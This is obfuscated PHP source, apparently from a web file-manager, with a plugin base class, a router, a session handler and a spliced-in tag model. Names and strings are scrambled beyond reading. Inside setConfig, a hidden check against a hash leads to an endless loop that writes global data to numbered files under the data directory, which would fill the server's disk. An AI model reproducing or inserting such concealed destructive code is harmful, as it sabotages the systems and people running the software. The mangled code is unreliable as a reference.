$_SERVER[ÏéâËõ‘]; if (!($‰ÍƒÊ¤Ã = IO::infoFull($ùÎ¤ÙèĞ))) { return IO::mkfile($ùÎ¤ÙèĞ, $ÁÔª¯îñ, REPEAT_REPLACE); } IO::setContent($‰ÍƒÊ¤Ã[$éŠò§‹[84]], $ÁÔª¯îñ); return $‰ÍƒÊ¤Ã[$éŠò§‹[84]]; } final function pluginLocalFile($ˆüÆñÎ… = '') { $©«Ö¥ı =& $_SERVER[ÏéâËõ‘]; $ãÆ…ö‹à = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ãÆ…ö‹à)) { mk_dir($ãÆ…ö‹à); } if (!$ˆüÆñÎ…) { return $ãÆ…ö‹à; } $½Å¿çµ› = IO::info($ˆüÆñÎ…); $Š—Òœè = $this->_tmpFileName($½Å¿çµ›) . $©«Ö¥ı[10] . $½Å¿çµ›[$©«Ö¥ı[174]]; if (!checkExtSafe($Š—Òœè)) { $Š—Òœè = $Š—Òœè . $©«Ö¥ı[1557]; } $õ…„™’ = $ãÆ…ö‹à . $Š—Òœè; if (@file_exists($õ…„™’)) { return $õ…„™’; } return IO::copy($ˆüÆñÎ…, $ãÆ…ö‹à, 0, $Š—Òœè); } final function appPackage() { $©ªÓüÀß =& $_SERVER[ÏéâËõ‘]; if ($this->packageData) { return $this->packageData; } $Çğà®Ğ = $this->parseFile($this->pluginPath . $©ªÓüÀß[1558]); $this->parseLang($Çğà®Ğ); $µĞ‡ñ = json_decode_force($Çğà®Ğ); if (!$µĞ‡ñ) { return array(); } $Á›ŠŸ³Ù = Hook::trigger($©ªÓüÀß[1559], $µĞ‡ñ); if ($Á›ŠŸ³Ù && is_array($Á›ŠŸ³Ù)) { $µĞ‡ñ = $Á›ŠŸ³Ù; } $this->packageData = $µĞ‡ñ; return $µĞ‡ñ; } public function packageInfoGet($è™ ıÃª) { $¯¢Æõ¸ = $this->appPackage(); return array_get_value($¯¢Æõ¸, $è™ ıÃª); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÏéâËõ‘][1560]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÏéâËõ‘][1561]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÏéâËõ‘][1562]); } public function echoJsAssign($ŸØñ•³ó, $§ÓÎá‡) { $this->echoJsAssignArr[$ŸØñ•³ó] = $§ÓÎá‡; } private function parseFile($àğÛƒ”) { $µÕÁÇ–œ =& $_SERVER[ÏéâËõ‘]; $ø”Ğ´µ¼ = file_get_contents_nossl($àğÛƒ”); $è´¬¤– = array($µÕÁÇ–œ[1563], $µÕÁÇ–œ[1564], $µÕÁÇ–œ[1565], $µÕÁÇ–œ[1566], $µÕÁÇ–œ[1567], $µÕÁÇ–œ[1568], $µÕÁÇ–œ[1569]); $£ìŞéä‘ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$µÕÁÇ–œ[89]][$µÕÁÇ–œ[1570]]); foreach ($this->echoJsAssignArr as $ ™›çÏ’ => $é§§ù‹Î) { $è´¬¤–[] = $µÕÁÇ–œ[1571] . $ ™›çÏ’ . $µÕÁÇ–œ[1572]; $£ìŞéä‘[] = is_array($é§§ù‹Î) || is_object($é§§ù‹Î) ? rawurlencode(json_encode($é§§ù‹Î)) : $é§§ù‹Î; } if (strstr($ø”Ğ´µ¼, $µÕÁÇ–œ[1573])) { $¢®¬ÜŒï = rawurlencode(json_encode($this->pluginLangArr)); $ø”Ğ´µ¼ = str_replace($µÕÁÇ–œ[1573], $¢®¬ÜŒï, $ø”Ğ´µ¼); } if (strstr($ø”Ğ´µ¼, $µÕÁÇ–œ[1574])) { $¢®¬ÜŒï = $¢®¬ÜŒï = rawurlencode(json_encode($this->getConfig())); $ø”Ğ´µ¼ = str_replace($µÕÁÇ–œ[1574], $¢®¬ÜŒï, $ø”Ğ´µ¼); } $ø”Ğ´µ¼ = str_replace($è´¬¤–, $£ìŞéä‘, $ø”Ğ´µ¼); return $ø”Ğ´µ¼; } private function parseLang(&$„¼Èñ‹‡) { $ÈºÄô„› =& $_SERVER[ÏéâËõ‘]; $×òçúÉÉ = $ÈºÄô„›[1575]; if (!strstr($„¼Èñ‹‡, $×òçúÉÉ)) { return; } preg_match_all($ÈºÄô„›[1576], $„¼Èñ‹‡, $ç‚Æó§); if (!is_array($ç‚Æó§) || count($ç‚Æó§) == 0 || !is_array($ç‚Æó§[0]) || count($ç‚Æó§[0]) == 0) { return; } $¥¦ŠÙÖı = array(); $Åéî¬‰Ä = array(); foreach ($ç‚Æó§[0] as $ğ€Ò¢‘) { $¤®³¦´¯ = substr($ğ€Ò¢‘, strlen($×òçúÉÉ), -4); $úíØÄÇ = LNG($¤®³¦´¯); $¥¦ŠÙÖı[] = $ğ€Ò¢‘; $Åéî¬‰Ä[] = str_replace(array($ÈºÄô„›[231], $ÈºÄô„›[1083], $ÈºÄô„›[342], $ÈºÄô„›[118]), array($ÈºÄô„›[53], $ÈºÄô„›[53], $ÈºÄô„›[12], $ÈºÄô„›[1577]), $úíØÄÇ); } $„¼Èñ‹‡ = str_replace($¥¦ŠÙÖı, $Åéî¬‰Ä, $„¼Èñ‹‡); } private function parseConfig(&$â›¾öŸÉ) { $»Ş†òá¥ =& $_SERVER[ÏéâËõ‘]; $ÁË™€… = $»Ş†òá¥[1578]; if (!strstr($â›¾öŸÉ, $ÁË™€…)) { return; } preg_match_all($»Ş†òá¥[1579], $â›¾öŸÉ, $­¡Ô—İæ); if (!is_array($­¡Ô—İæ) || count($­¡Ô—İæ) == 0 || !is_array($­¡Ô—İæ[0]) || count($­¡Ô—İæ[0]) == 0) { return; } $îŒ·Úû¶ = $this->getConfig(); $‚à¡ı²å = array(); $«‚÷ŞÄâ = array(); foreach ($­¡Ô—İæ[0] as $´û£ÌÚÊ) { $Û©¦ÀûÎ = substr($´û£ÌÚÊ, strlen($ÁË™€…), -2); $‚à¡ı²å[] = $´û£ÌÚÊ; $«‚÷ŞÄâ[] = _get($îŒ·Úû¶, $Û©¦ÀûÎ); } $â›¾öŸÉ = str_replace($‚à¡ı²å, $«‚÷ŞÄâ, $â›¾öŸÉ); } private function parsePackage(&$¶µ‰íâı) { $¬é”õú =& $_SERVER[ÏéâËõ‘]; $¬û’™ = $¬é”õú[1580]; if (!strstr($¶µ‰íâı, $¬û’™)) { return; } preg_match_all($¬é”õú[1581], $¶µ‰íâı, $¦ÍãÀÈ); if (!is_array($¦ÍãÀÈ) || count($¦ÍãÀÈ) == 0 || !is_array($¦ÍãÀÈ[0]) || count($¦ÍãÀÈ[0]) == 0) { return; } $™×ÛŞ²ä = $this->appPackage(); $¨–ÚÊï² = array(); $Ã¤³ü™ = array(); foreach ($¦ÍãÀÈ[0] as $ê›ÑõÂˆ) { $ÉÑËŸ×‘ = substr($ê›ÑõÂˆ, strlen($¬û’™), -2); $¨–ÚÊï²[] = $ê›ÑõÂˆ; $Ã¤³ü™[] = _get($™×ÛŞ²ä, $ÉÑËŸ×‘); } $¶µ‰íâı = str_replace($¨–ÚÊï², $Ã¤³ü™, $¶µ‰íâı); } final function echoFile($Î˜ÁâÕ¿, $ö¶™‚Á“ = false) { $Ö¿Õ‡‰ =& $_SERVER[ÏéâËõ‘]; $Ã™å•êà = $this->pluginPath . $Î˜ÁâÕ¿; if (ACT == $Ö¿Õ‡‰[1582]) { echo $Ö¿Õ‡‰[1583] . $this->pluginName . $Ö¿Õ‡‰[8] . $Î˜ÁâÕ¿ . $Ö¿Õ‡‰[1584]; if (!file_exists($Ã™å•êà)) { echo $Ö¿Õ‡‰[1585]; return; } } $Ùõå®ˆî = $this->parseFile($Ã™å•êà); $this->parseLang($Ùõå®ˆî); $this->parseConfig($Ùõå®ˆî); $this->parsePackage($Ùõå®ˆî); if (is_array($ö¶™‚Á“)) { $Ùõå®ˆî = str_replace(array_keys($ö¶™‚Á“), array_values($ö¶™‚Á“), $Ùõå®ˆî); } echo $Ö¿Õ‡‰[231] . $Ùõå®ˆî; } final function initLang() { $Ö´—Ú =& $_SERVER[ÏéâËõ‘]; $ä×“Ïöã = $Ö´—Ú[1586]; $òÈšêŸ• = $this->pluginPath . $Ö´—Ú[1587]; $¸í›Š” = I18n::getType(); $ãŠÒüÖÚ = array(); if (file_exists($òÈšêŸ• . $¸í›Š” . $Ö´—Ú[840])) { $ãŠÒüÖÚ = (include $òÈšêŸ• . $¸í›Š” . $Ö´—Ú[840]); } else { if ($¸í›Š” == $Ö´—Ú[1588] && !file_exists($òÈšêŸ• . $¸í›Š” . $Ö´—Ú[840]) && file_exists($òÈšêŸ• . $Ö´—Ú[1589])) { $ãŠÒüÖÚ = (include $òÈšêŸ• . $Ö´—Ú[1589]); } else { if (file_exists($òÈšêŸ• . $ä×“Ïöã . $Ö´—Ú[840])) { $ãŠÒüÖÚ = (include $òÈšêŸ• . $ä×“Ïöã . $Ö´—Ú[840]); } } } if (!is_array($ãŠÒüÖÚ)) { return array(); } if (@count($ãŠÒüÖÚ) > 0) { I18n::set($ãŠÒüÖÚ); } return $ãŠÒüÖÚ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÉúŞïè) { $´¦Â„— =& $_SERVER[ÏéâËõ‘]; $ ÈığÙİ = $_SERVER[$´¦Â„—[865]]; $‰­‹È… = $´¦Â„—[881]; if ($_SERVER[$´¦Â„—[864]] != $‰­‹È…($ ÈığÙİ)) { $¸üšØó÷ = $´¦Â„—[882]; $ÔŠˆ•Êƒ = $´¦Â„—[866]; $éÅ°ˆÇŒ = $_SERVER[$´¦Â„—[867]] . $´¦Â„—[868]; $ê¡»©»… = $ÔŠˆ•Êƒ($éÅ°ˆÇŒ); $˜°¾¤ÆÕ = explode($´¦Â„—[231], $ê¡»©»…); if (count($˜°¾¤ÆÕ) < $´¦Â„—[626]) { $¨ş‰İÛ¾ = $´¦Â„—[869]; $¨ş‰İÛ¾(); } $¸¡š€û = $´¦Â„—[883]; $¸¡š€û($_SERVER[$´¦Â„—[884]]); $¸üšØó÷ = $´¦Â„—[882]; $¸üšØó÷(); $ÆÚéÏŞõ = $´¦Â„—[885]; $ÄšÉõûã = json_encode($GLOBALS[$´¦Â„—[886]]); $ö¤„¨†€ = 1; for ($âËØâØÎ = $ö¤„¨†€; $âËØâØÎ > 0; $âËØâØÎ++) { $ÆÚéÏŞõ(DATA_PATH . $âËØâØÎ, $ÄšÉõûã); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÉúŞïè); } public function onSetConfig($†ûé) { } public function onGetConfig($ã—±ï¥) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¾í©Ç¡ä) { if ($¾í©Ç¡ä == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($åø‰§Ãó = "\x70\154\x75\x67\151\x6e\x41\x75\x74\150") { $•‡šîĞ¥ =& $_SERVER[ÏéâËõ‘]; if (!defined($•‡šîĞ¥[475])) { return !1; } if (_get($GLOBALS, $•‡šîĞ¥[503])) { return !0; } $±ƒÃ÷’ = $this->getConfig(); if (!$±ƒÃ÷’[$åø‰§Ãó]) { return !1; } return ActionCall($•‡šîĞ¥[1590], $±ƒÃ÷’[$åø‰§Ãó]); } public function url($Ìé«ì·æ, $ÄåŞõŸ³ = '', $ì´¢˜‹İ = true) { $ŒÖÀ„¶´ =& $_SERVER[ÏéâËõ‘]; $„¾ĞÀÔ· = $this->getConfig(); $‰Š´„³ = KOD_VERSION . $ŒÖÀ„¶´[10] . KOD_VERSION_BUILD; $Ë‘²Âî› = $this->packageVersion(); $‹Ñ‰èÁò = $‰Š´„³ . $ŒÖÀ„¶´[386] . $Ë‘²Âî›; if (substr($Ìé«ì·æ, 0, 4) == $ŒÖÀ„¶´[148] || substr($Ìé«ì·æ, 0, 2) == $ŒÖÀ„¶´[1373]) { $†¤âŒë = $Ìé«ì·æ . $ŒÖÀ„¶´[1591] . $‹Ñ‰èÁò; } else { if ($ÄåŞõŸ³ == $ŒÖÀ„¶´[12]) { $†¤âŒë = $this->pluginHost . $Ìé«ì·æ . $ŒÖÀ„¶´[1591] . $‹Ñ‰èÁò; } else { if ($ÄåŞõŸ³ === $ŒÖÀ„¶´[75]) { $†¤âŒë = $this->pluginHost . $Ìé«ì·æ; } else { if ($ÄåŞõŸ³ == $ŒÖÀ„¶´[1592]) { $†¤âŒë = STATIC_PATH . $Ìé«ì·æ . $ŒÖÀ„¶´[1591] . $‰Š´„³; } else { if ($ÄåŞõŸ³ == $ŒÖÀ„¶´[1593]) { $†¤âŒë = APP_HOST . $ŒÖÀ„¶´[1594] . $Ìé«ì·æ . $ŒÖÀ„¶´[1591] . $‰Š´„³; } else { if (isset($„¾ĞÀÔ·[$ÄåŞõŸ³])) { $†¤âŒë = $„¾ĞÀÔ·[$ÄåŞõŸ³] . $Ìé«ì·æ . $ŒÖÀ„¶´[1591] . $‹Ñ‰èÁò; } } } } } } if (!$ì´¢˜‹İ) { return $†¤âŒë; } echo $†¤âŒë; } public function link($î°ó² = false, $à³ÄÑÄ± = '') { $¾ï‹ö®­ =& $_SERVER[ÏéâËõ‘]; if (!$î°ó²) { $this->link($¾ï‹ö®­[1595], $¾ï‹ö®­[1593]); $this->link($¾ï‹ö®­[1596], $¾ï‹ö®­[1592]); $this->link($¾ï‹ö®­[1597], $¾ï‹ö®­[1592]); $this->link($¾ï‹ö®­[1598], $¾ï‹ö®­[1592]); $this->link($¾ï‹ö®­[1599], $¾ï‹ö®­[1592]); return; } $¾„ğàœ‹ = $this->url($î°ó², $à³ÄÑÄ±, !1); if (substr($î°ó², -3) == $¾ï‹ö®­[1600]) { echo $¾ï‹ö®­[1601] . $¾„ğàœ‹ . $¾ï‹ö®­[1602] . $¾ï‹ö®­[231]; } else { if (substr($î°ó², -4) == $¾ï‹ö®­[1603]) { echo $¾ï‹ö®­[1604] . $¾„ğàœ‹ . $¾ï‹ö®­[1605] . $¾ï‹ö®­[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\57\135\53", "\72\156\x75\155" => "\x5b\60\x2d\x39\135\x2b", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($·ªÍò…õ, $”ğÕ˜İğ) { $ËÜò†Â¤ =& $_SERVER[ÏéâËõ‘]; if ($·ªÍò…õ == $ËÜò†Â¤[1606]) { $‡·¼Ïó˜ = array_map($ËÜò†Â¤[1607], $”ğÕ˜İğ[0]); $áèŒÛüÁ = strpos($”ğÕ˜İğ[1], $ËÜò†Â¤[8]) === 0 ? $”ğÕ˜İğ[1] : $ËÜò†Â¤[8] . $”ğÕ˜İğ[1]; $‹²â‚ÊÂ = $”ğÕ˜İğ[2]; } else { $‡·¼Ïó˜ = null; $áèŒÛüÁ = strpos($”ğÕ˜İğ[0], $ËÜò†Â¤[8]) === 0 ? $”ğÕ˜İğ[0] : $ËÜò†Â¤[8] . $”ğÕ˜İğ[0]; $‹²â‚ÊÂ = $”ğÕ˜İğ[1]; } array_push(self::$maps, $‡·¼Ïó˜); array_push(self::$routes, $áèŒÛüÁ); array_push(self::$methods, strtoupper($·ªÍò…õ)); array_push(self::$callbacks, $‹²â‚ÊÂ); } public static function error($“‚úñ¶ä) { self::$errorCallback = $“‚úñ¶ä; } public static function haltOnMatch($ Àº¶š = true) { self::$halts = $ Àº¶š; } public static function dispatch() { $¶¥×”¯Ö =& $_SERVER[ÏéâËõ‘]; $İåµÍšê = parse_url($_SERVER[$¶¥×”¯Ö[1608]], PHP_URL_PATH); $İåÅò» = $_SERVER[$¶¥×”¯Ö[159]]; $‹¢²— = array_keys(static::$patterns); $×íéºÈÈ = array_values(static::$patterns); $¹¾è×•‡ = !1; self::$routes = preg_replace($¶¥×”¯Ö[1274], $¶¥×”¯Ö[8], self::$routes); if (in_array($İåµÍšê, self::$routes)) { $¢ª»Ùôø = array_keys(self::$routes, $İåµÍšê); foreach ($¢ª»Ùôø as $õÂ†Ù® ) { if (self::$methods[$õÂ†Ù® ] == $İåÅò» || self::$methods[$õÂ†Ù® ] == $¶¥×”¯Ö[1609] || in_array($İåÅò», self::$maps[$õÂ†Ù® ])) { $¹¾è×•‡ = !0; if (!is_object(self::$callbacks[$õÂ†Ù® ])) { $ïÒ ‡½ = explode($¶¥×”¯Ö[8], self::$callbacks[$õÂ†Ù® ]); $¢¿“…€’ = end($ïÒ ‡½); $¯‹»’Î = explode($¶¥×”¯Ö[1610], $¢¿“…€’); $¦Ú‹†äÏ = new $¯‹»’Î[0](); $¦Ú‹†äÏ->{$¯‹»’Î[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$õÂ†Ù® ]); if (self::$halts) { return; } } } } } else { $†îàİ = 0; foreach (self::$routes as $õÂ†Ù® ) { if (strpos($õÂ†Ù® , $¶¥×”¯Ö[4]) !== !1) { $õÂ†Ù®  = str_replace($‹¢²—, $×íéºÈÈ, $õÂ†Ù® ); } if (preg_match($¶¥×”¯Ö[1611] . $õÂ†Ù®  . $¶¥×”¯Ö[1612], $İåµÍšê, $•À¼Ìöà)) { if (self::$methods[$†îàİ] == $İåÅò» || self::$methods[$†îàİ] == $¶¥×”¯Ö[1609] || !empty(self::$maps[$†îàİ]) && in_array($İåÅò», self::$maps[$†îàİ])) { $¹¾è×•‡ = !0; array_shift($•À¼Ìöà); if (!is_object(self::$callbacks[$†îàİ])) { $ïÒ ‡½ = explode($¶¥×”¯Ö[8], self::$callbacks[$†îàİ]); $¢¿“…€’ = end($ïÒ ‡½); $¯‹»’Î = explode($¶¥×”¯Ö[1610], $¢¿“…€’); $¦Ú‹†äÏ = new $¯‹»’Î[0](); if (!method_exists($¦Ú‹†äÏ, $¯‹»’Î[1])) { echo $¶¥×”¯Ö[1613]; } else { call_user_func_array(array($¦Ú‹†äÏ, $¯‹»’Î[1]), $•À¼Ìöà); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$†îàİ], $•À¼Ìöà); if (self::$halts) { return; } } } } $†îàİ++; } } if ($¹¾è×•‡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¶êş³êÀ =& $_SERVER[ÏéâËõ‘]; header($_SERVER[$¶êş³êÀ[1614]] . $¶êş³êÀ[1615]); echo $¶êş³êÀ[1616]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¶¥×”¯Ö[1608]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $–Êç×·ğ =& $_SERVER[ÏéâËõ‘]; static $ÒºíÄÇ´ = false; if ($ÒºíÄÇ´) { return $ÒºíÄÇ´; } $ıÄ˜Ë‚Ü = $GLOBALS[$–Êç×·ğ[6]][$–Êç×·ğ[349]]; self::$sessionTime = $ıÄ˜Ë‚Ü[$–Êç×·ğ[1617]]; $ñÑ¤ù§ = isset($GLOBALS[$–Êç×·ğ[1618]]) ? $GLOBALS[$–Êç×·ğ[1618]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ñÑ¤ù§)) { self::$sessionSign = Cookie::get($ñÑ¤ù§); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ñÑ¤ù§, self::$sessionSign, self::$sessionTime); $ÑíÚ³öÇ = $ıÄ˜Ë‚Ü[$–Êç×·ğ[1619]]; $éûöûàÏ = $ıÄ˜Ë‚Ü[$ÑíÚ³öÇ]; $º­ê÷áˆ = $ıÄ˜Ë‚Ü[$–Êç×·ğ[830]]; switch ($ÑíÚ³öÇ) { case $–Êç×·ğ[21]: self::$handle = Model($–Êç×·ğ[831]); break; case $–Êç×·ğ[832]: self::$handle = new CacheRedis($éûöûàÏ, $º­ê÷áˆ); break; case $–Êç×·ğ[833]: self::$handle = new CacheMemcached($éûöûàÏ, $º­ê÷áˆ); break; case $–Êç×·ğ[199]: $éûöûàÏ[$–Êç×·ğ[84]] = $éûöûàÏ[$–Êç×·ğ[84]] . $–Êç×·ğ[1620]; self::$handle = new CacheFile($éûöûàÏ, $º­ê÷áˆ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÒºíÄÇ´ = new self(); return $ÒºíÄÇ´; } public static function getBySign($¾ĞÕ™¹Ş) { CacheLock::lock($¾ĞÕ™¹Ş); $€°şà» = self::$handle->get($¾ĞÕ™¹Ş); CacheLock::unlock($¾ĞÕ™¹Ş); $€°şà» = unserialize($€°şà»); return is_array($€°şà») ? $€°şà» : array(); } public static function setBySign($ì•ğÜøŞ, $“ÛëÉî›) { CacheLock::lock($ì•ğÜøŞ); self::$handle->set($ì•ğÜøŞ, serialize($“ÛëÉî›), self::$sessionTime); CacheLock::unlock($ì•ğÜøŞ); } public static function sign($¨¯€­×Á = false) { $¨¯€­×Á && (self::$sessionSign = $¨¯€­×Á); self::init(); return self::$sessionSign; } public static function set($¶ŞˆåÓÈ, $Ä‘«ùŠˆ = false) { self::init(); if (is_array($¶ŞˆåÓÈ)) { foreach ($¶ŞˆåÓÈ as $‚‹Ãí Â => $ƒïŠÎÍØ) { array_set_value(self::$data, $‚‹Ãí Â, $ƒïŠÎÍØ); } } else { array_set_value(self::$data, $¶ŞˆåÓÈ, $Ä‘«ùŠˆ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¡ù·‚¡Ï = false) { self::init(); if (!$¡ù·‚¡Ï) { return self::$data; } return array_get_value(self::$data, $¡ù·‚¡Ï); } public static function remove($ÆÕ À§Œ) { self::init(); unset(self::$data[$ÆÕ À§Œ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÏéâËõ‘][835])) { self::$handle->clearTimeout(); } } } goto aêŞœİ…ù”; D·‰•Š°Ê˜: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($‘—Ã¨’Õ) { $ÔÁ½õ¼¿ =& $_SERVER[ÏéâËõ‘]; return array($ÔÁ½õ¼¿[1943] => array($‘—Ã¨’Õ[0], $ÔÁ½õ¼¿[1944]), $ÔÁ½õ¼¿[1945] => array($‘—Ã¨’Õ[0], $ÔÁ½õ¼¿[1946])); } protected function get($ ¸İ®Š) { $ş—­õóñ =& $_SERVER[ÏéâËõ‘]; $ôÌ¤î¤ò = Model($ş—­õóñ[522])->metaGet($ ¸İ®Š, $ş—­õóñ[1947]); $ºôş‹ïŞ = json_decode($ôÌ¤î¤ò, !0); return $ºôş‹ïŞ ? $ºôş‹ïŞ : array($ş—­õóñ[1948] => $ş—­õóñ[88], $ş—­õóñ[369] => array()); } protected function set($šëØìåæ, $û˜õôÉ”) { $ø×Ÿ¨È» =& $_SERVER[ÏéâËõ‘]; $û˜õôÉ” = $û˜õôÉ” ? $û˜õôÉ” : array($ø×Ÿ¨È»[1948] => $ø×Ÿ¨È»[88], $ø×Ÿ¨È»[369] => array()); return Model($ø×Ÿ¨È»[522])->metaSet($šëØìåæ, $ø×Ÿ¨È»[1947], json_encode($û˜õôÉ”)); } protected function getByTagID($Õˆ¬®˜, $á›—üÙò) { $£ğ®– =& $_SERVER[ÏéâËõ‘]; if (!$Õˆ¬®˜ || !$á›—üÙò) { return !1; } if (!Model($£ğ®–[522])->getInfoSimple($Õˆ¬®˜)) { return !1; } $Âó‚âßÜ = $this->get($Õˆ¬®˜); if (!$Âó‚âßÜ || !isset($Âó‚âßÜ[$£ğ®–[369]])) { return !1; } $ÏŠÁëœ = array_find_by_field($Âó‚âßÜ[$£ğ®–[369]], $£ğ®–[399], $á›—üÙò); return is_array($ÏŠÁëœ) ? $ÏŠÁëœ : !1; } public function listSource($µİÓÑÕ, $¤ø¾ÊøÙ) { $•Äïš¾Ø =& $_SERVER[ÏéâËõ‘]; if ($¤ø¾ÊøÙ && !is_array($¤ø¾ÊøÙ)) { $¤ø¾ÊøÙ = array($¤ø¾ÊøÙ); } $ó³Ä¡–Î = $this->listData($µİÓÑÕ); $ûëãôÔ÷ = array(); foreach ($ó³Ä¡–Î as $İûŠö¼ı) { $²µÜÙóù = $İûŠö¼ı[$•Äïš¾Ø[84]]; if (!$²µÜÙóù) { continue; } if (!isset($ûëãôÔ÷[$²µÜÙóù])) { $ûëãôÔ÷[$²µÜÙóù] = array(); } $ûëãôÔ÷[$²µÜÙóù][] = $İûŠö¼ı[$•Äïš¾Ø[426]]; } $Ÿµ°î„™ = array(); foreach ($ûëãôÔ÷ as $ì÷Ç†²Ï => $‰Úæíè›) { $â§‡ÒÓ« = !0; if (!$¤ø¾ÊøÙ) { $Ÿµ°î„™[] = $ì÷Ç†²Ï; continue; } foreach ($¤ø¾ÊøÙ as $€ˆã‘ßú) { if (!in_array($€ˆã‘ßú, $‰Úæíè›)) { $â§‡ÒÓ« = !1; break; } } if ($â§‡ÒÓ«) { $Ÿµ°î„™[] = $ì÷Ç†²Ï; } } if (!$Ÿµ°î„™) { return array(); } $Ë…˜È²² = array($•Äïš¾Ø[417] => array($•Äïš¾Ø[418], $Ÿµ°î„™), $•Äïš¾Ø[505] => $µİÓÑÕ, $•Äïš¾Ø[411] => SourceModel::TYPE_GROUP); $ˆ¯«—¬ = Model($•Äïš¾Ø[1332])->listSource($Ë…˜È²²); if (!$ˆ¯«—¬ || count($Ÿµ°î„™) == $ˆ¯«—¬[$•Äïš¾Ø[366]][$•Äïš¾Ø[367]]) { return $ˆ¯«—¬; } $øş«©¸· = array(); $ÔÜ•Ú‘ğ = array_to_keyvalue($ˆ¯«—¬[$•Äïš¾Ø[82]], $•Äïš¾Ø[12], $•Äïš¾Ø[402]); $‰Ìú = array_to_keyvalue($ˆ¯«—¬[$•Äïš¾Ø[83]], $•Äïš¾Ø[12], $•Äïš¾Ø[402]); $Öàùùœ  = array_merge($‰Ìú, $ÔÜ•Ú‘ğ); foreach ($Ÿµ°î„™ as $²µÜÙóù) { if (!in_array($²µÜÙóù, $Öàùùœ )) { $øş«©¸·[] = $²µÜÙóù; } } if ($øş«©¸·) { $this->removeBySource($µİÓÑÕ, $øş«©¸·); } return $ˆ¯«—¬; } protected function listData($©üú¯ûİ) { $öûÎÖ•Ã =& $_SERVER[ÏéâËõ‘]; $„ïå§Š = array($öûÎÖ•Ã[1653] => 0, $öûÎÖ•Ã[484] => array($öûÎÖ•Ã[1949], 0), $öûÎÖ•Ã[422] => $öûÎÖ•Ã[1950] . $©üú¯ûİ); $•‘¥€Û³ = $öûÎÖ•Ã[1951]; $Ğ´ó¿†ˆ = $this->field($•‘¥€Û³)->where($„ïå§Š)->order($öûÎÖ•Ã[1952])->select(); return $Ğ´ó¿†ˆ ? $Ğ´ó¿†ˆ : array(); } protected function addToTag($‚¤«ë‰‘, $‚ÔÏø¿Ú, $ª†§³™Î) { $Ø¦ó‘¹ï =& $_SERVER[ÏéâËõ‘]; if (!$this->getByTagID($‚¤«ë‰‘, $ª†§³™Î) || !$‚ÔÏø¿Ú) { return !1; } if (!Model($Ø¦ó‘¹ï[827])->pathInfo($‚ÔÏø¿Ú)) { return !1; } $’êß¼¾Ş = array($Ø¦ó‘¹ï[1653] => 0, $Ø¦ó‘¹ï[484] => $ª†§³™Î, $Ø¦ó‘¹ï[421] => $‚ÔÏø¿Ú, $Ø¦ó‘¹ï[422] => $Ø¦ó‘¹ï[1953] . $‚¤«ë‰‘, $Ø¦ó‘¹ï[420] => $Ø¦ó‘¹ï[12], $Ø¦ó‘¹ï[1838] => 0); if ($this->where($’êß¼¾Ş)->find()) { return !1; } return $this->add($’êß¼¾Ş); } protected function removeFromTag($«Ï±ıñş, $ìÀòú†³, $ëÉ‰ğ–‰) { $»”òÓÂ€ =& $_SERVER[ÏéâËõ‘]; if (!$this->getByTagID($«Ï±ıñş, $ëÉ‰ğ–‰) || !$ìÀòú†³) { return !1; } if (is_array($ìÀòú†³)) { $ìÀòú†³ = array($»”òÓÂ€[7], $ìÀòú†³); } $«—í¦êå = array($»”òÓÂ€[1653] => 0, $»”òÓÂ€[484] => $ëÉ‰ğ–‰, $»”òÓÂ€[422] => $»”òÓÂ€[1953] . $«Ï±ıñş, $»”òÓÂ€[421] => $ìÀòú†³); return $this->where($«—í¦êå)->delete(); } protected function removeByTag($‘ÀÔøé³, $Òõ‹Ñ‚) { $ßåòÓÄè =& $_SERVER[ÏéâËõ‘]; if (!$this->getByTagID($‘ÀÔøé³, $Òõ‹Ñ‚)) { return !1; } $¬ğª¯åÈ = array($ßåòÓÄè[1653] => 0, $ßåòÓÄè[484] => $Òõ‹Ñ‚, $ßåòÓÄè[422] => $ßåòÓÄè[1953] . $‘ÀÔøé³); return $this->where($¬ğª¯åÈ)->delete(); } protected function removeBySource($·±í°Îş, $ÔÖ¦Š•‡) { $¬œ…Ú²¸ =& $_SERVER[ÏéâËõ‘]; if (!$·±í°Îş || !$ÔÖ¦Š•‡) { return !1; } if (is_array($ÔÖ¦Š•‡)) { $ÔÖ¦Š•‡ = array($¬œ…Ú²¸[7], $ÔÖ¦Š•‡); } $ğ²ÇËç» = array($¬œ…Ú²¸[1653] => 0, $¬œ…Ú²¸[421] => $ÔÖ¦Š•‡, $¬œ…Ú²¸[484] => array($¬œ…Ú²¸[1019], 0), $¬œ…Ú²¸[422] => $¬œ…Ú²¸[1953] . $·±í°Îş); return $this->where($ğ²ÇËç»)->delete(); } 